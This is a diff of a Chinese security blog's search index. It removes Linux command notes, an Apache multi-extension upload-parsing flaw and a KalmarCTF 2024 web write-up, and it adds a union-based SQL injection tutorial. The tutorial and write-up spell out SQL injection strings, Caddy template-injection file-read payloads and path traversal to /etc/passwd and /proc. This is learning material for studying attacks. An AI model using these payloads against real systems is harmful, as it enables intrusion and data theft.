-按文件所属组查找。
-
-
-cd 命令对应单词：change directory
-功能：更改当前的工作目录
-格式:
-cd 目录
-
-cd搭配符号
-
-
-
-命令
-含义
-
-
-
-cd  &#x2F;cd ~
-切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)
-
-
-cd .
-保持在当前目录不变
-
-
-cd ..
-切换到上级目录
-
-
-cd –
-可以在最近两次工作目录之间来回切换
-
-
-touch命令功能：
-
-如果文件不存在，可以创建一个空白文件 
-如果文件已经存在，可以修改文件的末次修改日期
-
-mkdir命令对应单词：make directory
-功能：创建一个新的目录
-
-
-
-选项
-含义
-
-
-
--p
-创建多级目录需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）
-
-
-注意：新建目录的名称 不能与当前目录中 已有的目录同名
-rm命令对应单词：remove
-功能：删除文件或目录
-
-
-
-可选参数
-含义
-
-
-
--f
-强制删除，忽略不存在的文件，无需提示
-
-
--r
-递归地删除目录下的内容，删除文件夹时必须加此参数
-
-
-cp命令对应单词：copy
-功能：复制文件或者目录
-
-
-
-可选参数
-含义
-
-
-
--i
-覆盖文件前提示
-
-
--r
-若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名
-
-
-mv命令对应单词：move
-功能：移动文件或者目录／文件或者目录重命名
-
-
-
-可选参数
-含义
-
-
-
--i
-覆盖文件前提示
-
-
-cat命令对应单词：  concatenate
-功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件
-
-
-
-可选参数
-含义
-
-
-
--b
-对非空输出行编号
-
-
--n
-对输出的所有行编号
-
-
-more命令对应单词：  more
-功能：  分屏显示文件内容
-使用 more 的操作键：
-
-
-
-操作键
-功能
-
-
-
-空格键
-显示手册页的下一屏
-
-
-Enter
-键 一次滚动手册页的一行
-
-
-b
-回滚一屏
-
-
-f
-前滚一屏
-
-
-q
-退出
-
-
-&#x2F;word
-搜索 word 字符串
-
-
-echo命令对应单词：  more
-功能：  在终端中显示参数指定的文字，通常会和重定向联合使用
-进程命令ps命令：英文：  process status 
-作用：显示当前正在运行的进程的快照。
-
-
-
-命令
-作用
-
-
-
-ps aux
-查看进程的详细状况
-
-
-ps -ef
-显示所有进程的完整信息
-
-
-ps 进程代号
-显示特定进程代号的详细信息
-
-
-top
-
-
-
-kill [-9] 进程代号
-终止指定代号的进程， -9 表示强行终止
-
-
-ps 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明
-
-
-
-选项
-含义
-
-
-
-a
-显示终端上的所有进程，包括其他用户的进程
-
-
-u
-显示进程的详细状态
-
-
-x
-显示没有控制终端的进程
-
-
-top命令：作用：  动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序
-输入 q退出 top 命令界面
-kill命令：作用：  向进程发送信号以终止或操作进程
-常见用法
-
-
-
-命令
-作用
-
-
-
-kill 进程代号
-向指定进程代号的进程发送默认的终止信号
-
-
-kill -9 进程代号
-向指定进程代号的进程发送强制终止信号
-
-
-提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃
-pgrep命令：作用：  向进程发送信号以终止或操作进程
-pgrep [选项] &lt;进程名称&gt;
-
-其中，&lt;进程名称&gt; 是要匹配的进程名称或模式。可以使用通配符进行模糊匹配。
-
-
-
-可选选项
-说明
-
-
-
--u &lt;用户名&gt;
-根据用户名过滤进程。
-
-
--n
-仅返回最新的匹配进程的进程 ID。
-
-
--x
-精确匹配进程名称，不进行模糊匹配。
-
-
--d &lt;分隔符&gt;
-指定输出的分隔符，默认为换行符。
-
-
-参考文章
-参考菜鸟教程的文章
-原文链接：Linux 用户和用户组管理 | 菜鸟教程 (runoob.com)、Linux find 命令 | 菜鸟教程 (runoob.com)
-
-参考腾讯云开发者社区博主全栈程序员站长的文章
-原文链接：史上最全的Linux常用命令汇总（超全面！超详细！）收藏这一篇就够了！-腾讯云开发者社区-腾讯云 (tencent.com)
-
-
-]]></content>
-      <categories>
-        <category>操作系统</category>
+        <category>CTF</category>
       </categories>
       <tags>
         <tag>CTF-Web</tag>
+        <tag>Web-SQL</tag>
       </tags>
   </entry>
   <entry>
-    <title>中间件漏洞</title>
-    <url>/posts/2304588875/</url>
-    <content><![CDATA[施工中
-Apache2.0-2.2版本存在个漏洞 CE-2012-0053:
-攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。
-core - Apache HTTP Server 版本 2.4
-Apache解析配置漏洞\多后缀名解析配置漏洞解析配置漏洞简介此漏洞实际为人为的错误配置导致的漏洞，与Apache本身无关。
-Apache对于多后缀文件的处理规则是：Files with Multiple Extensions-mod_mime
- 对应的翻译 
-              
-              元数据指扩展名映射到关于语言、内容类型、字符集或编码的信息   原文： metadata (language, content type, character set or encoding) 文件可以有多个扩展名；扩展名的顺序通常是无关紧要的。例如，如果文件 welcome.html.fr 映射到内容类型 text&#x2F;html 和法语，则文件 welcome.fr.html 会映射到完全相同的信息。如果给出了多个映射到相同类型元数据的扩展名，则右边的扩展名将被使用，语言和内容编码除外。例如，如果 .gif 映射到媒体类型 image&#x2F;gif，而 .html 映射到媒体类型 text&#x2F;html，则文件 welcome.gif.html 将与媒体类型 text&#x2F;html 关联。语言和内容编码被视为累积的，因为可以为特定资源分配不止一种语言或编码。例如，文件 welcome.html.en.de 将以 Content-Language: en, de 和 Content-Type: text&#x2F;html 交付。当一个具有多个扩展名的文件同时与媒体类型和处理程序关联时，应该小心处理。这通常会导致请求由与处理程序关联的模块处理。例如，如果 .imap 扩展名映射到处理程序 imap-file（来自 mod_imagemap），而 .html 扩展名映射到媒体类型 text&#x2F;html，则文件 world.imap.html 将同时与 imap-file 处理程序和 text&#x2F;html 媒体类型关联。处理时，将使用 imap-file 处理程序，因此它将被视为一个 mod_imagemap 图像映射文件。如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi，而是使用仅基于最终扩展名SetHandler配置处理程序&lt;FilesMatch &quot;[^.]+\.cgi$&quot;&gt;  SetHandler cgi-script&lt;/FilesMatch&gt;
-              
-            
+    <title>SQL注入-联合查询(union)注入</title>
+    <url>/posts/1145624611/</url>
+    <content><![CDATA[联合查询介绍联合查询语句：
+select a from b union select c from d where e;
 
-Apache对多后缀文件的识别概括来说为：
+使用条件：页面对查询语句有回显查询数据
+注意事项：
 
-Apache允许文件有多个扩展名，并且会将所有后缀名进行识别，识别的顺序为：从右到左
-如： .html.fr 映射到 Content-Type: text/html 和Content-Language: de。
+使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显)
+
+若前部分有结果，可在每次的union查询后添加语句limit n,1(n根据题目实际进行切换)起到回显联合查询结果的作用
+注：limit num1，num2的作用为从第num1行开始显示num2行内容
 
 
-Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。
-如 .html 映射到 Content-Type: text/html。
+所需函数1.concat()函数
+​	concat()函数：将多个不同字段的字符串连接成一个字符串。
+concat(str1，str2) #语法
 
+注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
+2.group_concat()函数
+​	group_concat() 将多个同个字段的字符串连接成一个字符串。
+group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法
 
-对于相同类型元数据，以从右到左第一个出现的为准，但对于语言和内容编码可累积的元数据，将会叠加。
-如：.gif.html根据此规则映射到 Content-Type: text/html。
-​      .html.en.de根据此规则映射到Content-Language: en, de 和 Content-Type: text/html
+注入流程
+判断类型链接：SQL注入-基础 | WELLS Blog
 
+字段数联合查询(union)，必选保证union前后两个查询的字段数一致，即两个查询结果有相同的列数，因此要对前一个的字段数进行判断。可以使用order by 数字进行判断
+注：order by n表示查询结果通过第n个字段进行排序
+使用示例：
+id=1&#x27; order by 1 --+
 
-由于映射到处理程序和映射媒体类型，最后的返回结果不一致（一个为经过程序处理，一个为返回媒体文件）。当出现不同扩展名映射到处理程序和媒体类型时，映射到处理程序的优先等级高于映射到媒体类型
-如：.imap.html扩展名.imap 映射到处理程序 imap-file， .html 映射到Content-Type: text/html ，根据上述原则，.imap.html文件会被imap-file程序处理
+使用时不断增大数字，假设直至第n个出现错误，从而判断出字段数为n-1
 
+回显点知道字段数之后，我们还需要确定在哪个字段是回显到页面上的
+直接根据字段数，联合查询数字1，2，3...,以三个字段数为例
+id=1&#x27; order by union select 1,2,3 --+
 
+从页面上查找回显的是哪个数字
 
- 一点我的理解 
-              
-              按我的理解：元数据（metadata）是用于指示文件的类型或处理方式这里我把元数据（metadata）的定义包括了处理方式，根据一下段落合理的进行拓展定义If you would prefer only the last dot-separated part of the filename to be mapped to a particular piece of meta-data, then do not use the Add* directives. For example, if you wish to have the file foo.html.cgi processed as a CGI script, but not the file bar.cgi.html, then instead of using AddHandler cgi-script .cgi如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi因此当出现多个映射到处理程序，会按照从右到左第一个出现的为准，进行处理程序
-              
-            
+爆库名、表名，字段名，数据
 
-
-
-使用 Add* 指令，Apache处理一个文件时会应用上述规则
-Add* 指令指的是如：AddType、AddDefaultCharset、AddEncoding、AddHandler、AddOutputFilter、AddLanguage、AddCharset等指令，其中AddHandler设置对应后缀名映射到处理程序，如：
-AddHandler application/x-httpd-php .php
-
-
-
-由此，当用户上传一个a.php.jpg文件时，Apace的配置文件中包含AddHandler处理PHP文件，且未对上传后的文件进行重命名，此时a.php.jpg被解析为一个PHP脚本，解析漏洞由此而来
-
-
-
-
-解析配置漏洞条件
-文件没有被重命名
-Apache中配置中含有AddHandler的设置
-
-解析配置漏洞解决办法
-将上传的文件进行重命名
-根据官方文档的说明，可以使用SetHandler指令来代替AddHandler，因为SetHandler仅根据最右端的后缀名来判断映射的处理程序
+​	使用union语句在回显位置导出数据库中的数据，结合SQL注入-基础 | WELLS Blog中的SQL注入常用基础语句
+以2位置为回显点，爆表名为例
+id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
 
 ]]></content>
       <categories>
@@ -2187,248 +2611,7 @@ Apache中配置中含有AddHandler的设置
       </categories>
       <tags>
         <tag>CTF-Web</tag>
-        <tag>Web-Middleware</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024KalmarCTF-WEB复盘</title>
-    <url>/posts/1876369856/</url>
-    <content><![CDATA[
-前言：
-靶场链接：https://kalmarc.tf/challenges
-难度太大了根本写不出来参考大佬的题解最后复盘出来的
-原文链接：https://ireland.re/posts/KalmarCTF_2024/
-
-复盘题解Ez ⛳ v2题目描述
-Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports HTTP3? Or TLS1.3? etc
-Caddy web服务器非常棒，使用简洁紧凑的语法可以做很多强大的事情，例如，想知道你的浏览器是否支持HTTP3？或者TLS1.3？等等。
-Flag is located at GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64) go fetch it.
-Flag 位于GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)，去获取它吧。
-附件：点击下载附件
-
-解题思路下载完打开附件包发现只有四个文件，Caddyfile、docker-compose.yml这两个中有比较有用的信息
-docker-compose.yml中的关键信息
-caddy:  image: caddy:2.7.6-alpine  volumes:    - ./Caddyfile:/etc/caddy/Caddyfile:ro    - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro  # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD    					   # 文件将在生产环境中被重新命名为类似的随机名称
-
-Caddyfile中为对Caddy的配置文件
-(sec_headers) &#123;    root * /    header &#123;        Content-Security-Policy &quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;        Strict-Transport-Security &quot;max-age=31536000&quot;        X-XSS-Protection 0        X-Content-Type-Options nosniff        X-Frame-Options DENY        Referrer-Policy &quot;no-referrer&quot;    &#125;&#125;(html_reply) &#123;    import sec_headers    header Content-Type text/html    templates    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;&#125;(json_reply) &#123;    templates &#123;        # By default placeholders are not replaced for json        mime application/json    &#125;    header Content-Type application/json    respond &quot;&#123;args[0]&#125;&quot;&#125;(http_reply) &#123;    tls internal &#123;        alpn &quot;&#123;args[0]&#125;&quot;    &#125;    map &#123;args[0]&#125; &#123;proto_name&#125; &#123;        http/1.1 HTTP/1.1        h2 HTTP/2.0        h3 HTTP/3.0    &#125;    @correctALPN `&#123;http.request.proto&#125; == &#123;proto_name&#125;`    respond @correctALPN &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;    import html_reply &quot;You are connected with &#123;http.request.proto&#125; instead of &#123;proto_name&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;). &lt;!-- Debug: &#123;http.request.uuid&#125;--&gt;&quot;&#125;(tls_reply) &#123;    tls internal &#123;        protocols &#123;args[0]&#125; &#123;args[1]&#125;    &#125;    header Access-Control-Allow-Origin &quot;*&quot;    import json_reply &#123;&quot;tls_version&quot;:&quot;&#123;tls_version&#125;&quot;,&quot;alpn&quot;:&quot;&#123;http.request.tls.proto&#125;&quot;,&quot;sni&quot;:&quot;&#123;http.request.tls.server_name&#125;&quot;,&quot;cipher_suite&quot;:&quot;&#123;http.request.tls.cipher_suite&#125;&quot;&#125;&#125;mtls.caddy.chal-kalmarc.tf &#123;    tls internal &#123;        client_auth &#123;            mode require        &#125;    &#125;    templates    import html_reply `You are connected with client-cert &#123;http.request.tls.client.subject&#125;`&#125;tls.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.2 tls1.3&#125;tls12.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.2 tls1.2&#125;tls13.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.3 tls1.3&#125;ua.caddy.chal-kalmarc.tf &#123;    tls internal    templates    import html_reply `User-Agent: &#123;&#123;.Req.Header.Get &quot;User-Agent&quot;&#125;&#125;`&#125;http.caddy.chal-kalmarc.tf &#123;    tls internal    templates    import html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;&#125;http1.caddy.chal-kalmarc.tf &#123;    import http_reply http/1.1&#125;http2.caddy.chal-kalmarc.tf &#123;    import http_reply h2&#125;http3.caddy.chal-kalmarc.tf &#123;    import http_reply h3&#125;caddy.chal-kalmarc.tf &#123;    tls internal    import html_reply `Hello! Wanna know you if your browser supports &lt;a href=&quot;https://http1.caddy.chal-kalmarc.tf/&quot;&gt;http/1.1&lt;/a&gt;? &lt;a href=&quot;https://http2.caddy.chal-kalmarc.tf/&quot;&gt;http/2&lt;/a&gt;? Or fancy for some &lt;a href=&quot;https://http3.caddy.chal-kalmarc.tf/&quot;&gt;http/3&lt;/a&gt;?! Check your preference &lt;a href=&quot;https://http.caddy.chal-kalmarc.tf/&quot;&gt;here&lt;/a&gt;.&lt;br/&gt;We also allow you to check &lt;a href=&quot;https://tls12.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.2&lt;/a&gt;, &lt;a href=&quot;https://tls13.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.3&lt;/a&gt;, &lt;a href=&quot;https://tls.caddy.chal-kalmarc.tf/&quot;&gt;TLS preference&lt;/a&gt;, supports &lt;a href=&quot;https://mtls.caddy.chal-kalmarc.tf/&quot;&gt;mTLS&lt;/a&gt;? Checkout your &lt;a href=&quot;https://ua.caddy.chal-kalmarc.tf/&quot;&gt;User-Agent&lt;/a&gt;!&lt;!-- At some point we might even implement a &lt;a href=&quot;https://flag.caddy.chal-kalmarc.tf/&quot;&gt;flag&lt;/a&gt; endpoint! --&gt;`&#125;
-
-对于没用接触过的Caddy的我只能去官方文档看看其中的配置文件所代表的含义  查了下发现还有中文文档哈哈哈哈哈哈哈哈哈哈
-链接：Caddy v2中文文档 (dengxiaolong.com)
-不懂的就半查半猜，问问狗屁通，然后有个初步的理解:
-Caddy中存在一个概念：片段
-(指令名)&#123;	具体的指令内容&#125;
-
-例如：
-(html_reply) &#123;    import sec_headers    header Content-Type text/html    templates    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;&#125;
-
-片段类似于我们熟悉的概念：函数，可以在被调用
-在任何你需要的地方重复使用它：
-import 指令名
-
-
-
-块
-块由一对花括号完成的：
-... &#123;	...&#125;
-
-花括号前写所服务的域名，花括号后填写对应的指令
-此外在片段中有一个特别的指令：templates-模板，类似于python中的Jinja2模板引擎，进行实时渲染
-对应的官方文档：Module http.handlers.templates - Caddy Documentation (caddyserver.com)
-根据templates对应的语法规则（&#123;&#123;指令&#125;&#125;）尝试能不能和Python一样进行模板注入
-由于修改UA（User-Agent）比较方便，所以我选择了ua.caddy.chal-kalmarc.tf，将UA修改为&#123;&#123;7*7&#125;&#125;发现服务端返回了500错误，发现这个思路应该是有戏，修改为&#123;&#123;.Host&#125;&#125;发现最后页面返回了User-Agent: ua.caddy.chal-kalmarc.tf，发现确实可以进行类似模板注入的操作，而官方文档中有两个可以让我们读到flag的指令
-1.readFile
-Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.按原样读取并返回另一个文件的内容。请注意，内容不会被转义，因此您应该只读取受信任的文件。
-&#123;&#123;readFile &quot;path/to/file.html&quot;&#125;&#125;
-
-2.listFiles
-Returns a list of the files in the given directory, which is relative to the template context’s file root.返回给定目录中的文件列表，该列表相对于模板上下文的文件根目录。
-&#123;&#123;listFiles &quot;/mydir&quot;&#125;&#125;
-
-因此我们修改UA为&#123;&#123;listFiles "/"&#125;&#125;获得flag的文件名： CVGjuzCIVR99QNpJTLtBn9
-然后再修改UA为&#123;&#123;readFile "/CVGjuzCIVR99QNpJTLtBn9"&#125;&#125;，最后成功获取flag：
-kalmar&#123;Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate&#125;
-BadAss Server for Hypertext强悍的超文本服务器
-题目描述
-I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right?
-我自己写了一个HTTP服务器。我必须承认：代码有点诡异，但是它能正常工作！所以没问题，对吗？
-
-前置知识
-/proc目录以及子目录的功能及其作用
-shell语言
-通配符
-
-解题思路这是一个黑盒测试，点击题目链接后发现就一个按钮可以交互
-
-点击这个按钮，跳转到http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg，没用任何信息。查看初始页面的源码发现被隐藏了另一个按钮
-&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;	&lt;button&gt;Get the flag&lt;/button&gt;&lt;/a&gt; --&gt;
-
-再次点进去，发现就一句话：Did you think it was this easy? Nah, this isn&#39;t the flag.
-也没什么实际的价值点（其实后面这两个东东会被利用到），然后就是无头无脑的不断尝试了robots.txt、抓包再发包
-这个过程中发现了一个比较有趣的，响应头中存在这样一个键值：X-Powered-By: Bash，shell语言做后端？？
-发现随便输入一个内容到url后如果不存在会输出为：cat: /app/static/1: No such file or directory，可以大胆推测后端为shell语言了
-然后我就开始怀疑是不是有目录创越的漏洞存在了，拦截请求包转到BP进行改包（浏览器的url中直接输入..会被删除，而并不会直接传会后端）将url修改为/../../../../../etc/passwd,返回包中出现了passwd中对应的内容
-
-逻辑漏洞1：发现目录穿越漏洞确实存在，可以尝试直接读一下/flag发现根目录下不存在flag文件，那就只能进/proc目录找找对应的进程和运行目录了，一般读取1进程（一般赛题docker中最初的线程号为1）和self进程（当前指令所属的进程），一通乱尝试cmdline、environ、status等等发现了一些有用的东西
-在/../../../../../proc/1/cmdline尝试读取后端的运行程序
-HTTP/1.0 200 OKContent-Type: inode/x-emptyX-Powered-By: BashContent-Length: 0Connection: closesocat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh
-
-此时我们可以找到我们的后端所属的脚本文件，我们再将它读取出来，尝试看看源码中是否存在漏洞。读取到的源码为：
-#!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=&quot;200 OK&quot;abort() &#123;	declare -gA response_headers	status=&quot;400 Bad Request&quot;	write_headers	if [ ! -z $&#123;1+x&#125; ]; then		&gt;&amp;2 echo &quot;Request aborted: $1&quot;		echo -en $1	fi	exit 1&#125;write_headers() &#123;	response_headers[&#x27;Connection&#x27;]=&#x27;close&#x27;	response_headers[&#x27;X-Powered-By&#x27;]=&#x27;Bash&#x27;	echo -en &quot;HTTP/1.0 $status\r\n&quot;	for key in &quot;$&#123;!response_headers[@]&#125;&quot;; do		echo -en &quot;$&#123;key&#125;: $&#123;response_headers[$key]&#125;\r\n&quot;	done	echo -en &#x27;\r\n&#x27;	&gt;&amp;2 echo &quot;$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;) $SOCAT_PEERADDR $method $uri $protocol -&gt; $status&quot;&#125;receive_request() &#123;	read -d $&#x27;\n&#x27; -a request_line	if [ $&#123;#request_line[@]&#125; != 3 ]; then		abort &quot;Invalid request line&quot;	fi	method=$&#123;request_line[0]&#125;	uri=$&#123;request_line[1]&#125;	protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)	if [[ ! $method =~ ^(GET|HEAD)$ ]]; then		abort &quot;Invalid request method&quot;	fi	if [[ ! $uri =~ ^/ ]]; then		abort &#x27;Invalid URI&#x27;	fi	if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then		abort &#x27;Invalid protocol&#x27;	fi	while read -d $&#x27;\n&#x27; header; do		stripped_header=$(echo -n &quot;$header&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)		if [ -z &quot;$stripped_header&quot; ]; then			break;		fi		header_name=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 1 | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27;);		header_value=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 2- | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;);		if [ -z &quot;$header_name&quot; ] || [[ &quot;$header_name&quot; =~ [[:space:]] ]]; then			abort &quot;Invalid header name&quot;;		fi		# If header already exists, add value to comma separated list		if [[ -v request_headers[$header_name] ]]; then			request_headers[$header_name]=&quot;$&#123;request_headers[$header_name]&#125;, $header_value&quot;		else			request_headers[$header_name]=&quot;$header_value&quot;		fi	done	body_length=$&#123;request_headers[&quot;content-length&quot;]:-0&#125;	if [[ ! $body_length =~ ^[0-9]+$ ]]; then		abort &quot;Invalid Content-Length&quot;	fi	read -N $body_length request_body&#125;handle_request() &#123;	# Default: serve from static directory	path=&quot;/app/static$uri&quot;	path_last_character=$(echo -n &quot;$path&quot; | tail -c 1)	if [ &quot;$path_last_character&quot; == &#x27;/&#x27; ]; then		path=&quot;$&#123;path&#125;index.html&quot;	fi	if ! cat &quot;$path&quot; &gt; /dev/null; then		status=&quot;404 Not Found&quot;	else		mime_type=$(file --mime-type -b &quot;$path&quot;)		file_size=$(stat --printf=&quot;%s&quot; &quot;$path&quot;)		response_headers[&quot;Content-Type&quot;]=&quot;$mime_type&quot;		response_headers[&quot;Content-Length&quot;]=&quot;$file_size&quot;	fi	write_headers	cat &quot;$path&quot; 2&gt;&amp;1&#125;receive_requesthandle_request
-
-由于是shell语言这里我想到了一些shell中的一些骚操作例如：
- $&#123;变量名&#125;  #会将变量的值进行拓展出来$(命令)  #会执行（）中的命令`命令`  #会执行` `中的命令
-
- 拓展：shell语言中的部分特性 
-              
-              特性1：展开按照展开顺序分为：花括号展开（Brace Expansion）：花括号展开可以用来生成一系列具有相似结构的字符串。例如，使用花括号展开可以生成一组文件名或者一组命令参数。示例：$ echo &#123;a,b,c&#125;a b c$ echo file&#123;1..3&#125;.txtfile1.txt file2.txt file3.txt波浪线展开（Tilde Expansion）：波浪线展开用于扩展波浪线后面的特殊字符，通常用于表示用户的主目录路径。示例：$ echo ~/home/username$ echo ~/Documents/home/username/Documents参数，变量，算术展开和命令替换：参数展开用于访问脚本或函数的参数，变量展开用于展开变量的值，算术展开用于进行数学运算，而命令替换用于将命令的输出作为展开结果。示例：$ echo $HOME/home/username$ echo $((2 + 2))4$ echo $(ls)file1.txt file2.txt file3.txt单词分割（Word Splitting）：单词分割用于将字符串按照特定的分隔符进行拆分，常见的分隔符包括空格、制表符和换行符。示例：$ string=&quot;Hello World&quot;$ echo $stringHello World$ for word in $string; do echo $word; doneHelloWorld文件名展开（Filename Expansion）：文件名展开用于匹配文件系统中的文件名模式，常见的通配符包括星号（*）和问号（?）。示例：$ ls *.txtfile1.txt file2.txt file3.txt$ rm file?.txt特性2：单双引号的区别单引号：使用单引号，单引号中的内容一律被视为字符串，不进行转义，无法被扩展，${}、$()、反引号、通配符无法被使用例如：root@ubuntu:/home/ubuntu/Desktop# echo /*/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo &#x27;/*&#x27;/*root@ubuntu:/home/ubuntu/Desktop# echo &#x27;$(date)&#x27;$(date)双引号：变量展开：双引号内的变量会被展开，即变量的值会替换变量本身。命令替换：双引号内的命令替换（使用$()或反引号&#96;&#96;）会被执行，其输出会替换命令本身。通配符不会展开：双引号内的通配符（如*、?等）不会被作为通配符处理，而是作为普通字符。转义字符：某些特殊字符（如$、反引号、\）可以通过反斜线进行转义以表示其字面意义。例如：#变量展开root@ubuntu:/home/ubuntu/Desktop# path=&quot;*&quot;root@ubuntu:/home/ubuntu/Desktop# echo &quot;$&#123;path&#125;&quot;*#命令替换root@ubuntu:/home/ubuntu/Desktop# echo &quot;$(date)&quot;2024年 03月 24日 星期日 16:55:37 CST#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo &quot;*&quot;*特性3：变量展开后的字符串1.进行变量展开后，通配符不受 展开前单双引号性质的影响​	只要最后使用变量时，最外层不存在&quot;&quot;即可展开例如#test1path=&#x27;*&#x27;path_after=&quot;./*&quot;echo $path_after #变量替换后，最外层也无&quot;&quot;的影响，此时通配符*可被展开#输出结果：./badass_server.sh ./character1.sh ./character2.sh#test2path=&#x27;*&#x27;path_after=&quot;./$path&quot;echo ”$path_after“ #变量替换后，最外层存在&quot;&quot;的影响，通配符无法展开#输出结果： ./*2.进行变量展开后，变量展开、命令替换受最开始赋值时的单双引号影响​	若最开始时使用单引号，无论最后使用变量时，最外层存不存在引号，都无法被展开例如：#test1path=&#x27;$(date)&#x27;path_after=&quot;./$path&quot;echo $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# ./$(date)# ./$(date)#test2data= dateecho $datapath=&#x27;$&#123;data&#125;&#x27;path_after=&quot;./$path&quot;echo $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# Sun Mar 24 21:29:51     2024# ./$&#123;data&#125;# ./$&#123;data&#125;
-              
-            
-
-但经过尝试，发现无法通过控制$path这个值变为$&#123;&#125;使最后的cat返回命令替换的结果
-预想结果（可以通过cat的报错获取信息，如果这种办法可行剩下的只是空格的绕过）：
-root@ubuntu:/home/ubuntu/Desktop# url=$(ls)root@ubuntu:/home/ubuntu/Desktop# path=&quot;app/static/$url&quot;root@ubuntu:/home/ubuntu/Desktop# cat &quot;$path&quot;cat: &#x27;app/static/1.sh&#x27;$&#x27;\n&#x27;&#x27;2&#x27;: 没有那个文件或目录
-
-实际结果
-
- 拓展：shell语言中的部分特性 
-              
-              特性4：read命令处理字符串使用read命令来读取输入的字符串时，所读取的字符串相当于被单引号包围，具有单引号包裹的字符串的特点变量不展开：单引号内的内容都会被当作普通字符串处理，包括变量，它们不会被展开。命令不替换：单引号内的命令不会被执行，即使使用$()或反引号&#96;&#96;。通配符不展开：单引号内的通配符同样不会被展开，被视为普通文本。转义字符不工作：单引号内几乎所有的字符都被视为普通字符，包括反斜线（\），它不具有转义功能。例如：#test1read -d $&#x27;\n&#x27; -a request_linemethod=$&#123;request_line[0]&#125;echo $method#输入：$(ls) $(ls) $(ls)#输出：$(ls)#test2request_line=(&quot;$(ls)&quot; &quot;$(ls)&quot;)method=$&#123;request_line[0]&#125;echo $method#输出：badass_server.sh bash.md
-              
-            
-
-此时发现我们可控点只剩下$protocol变量
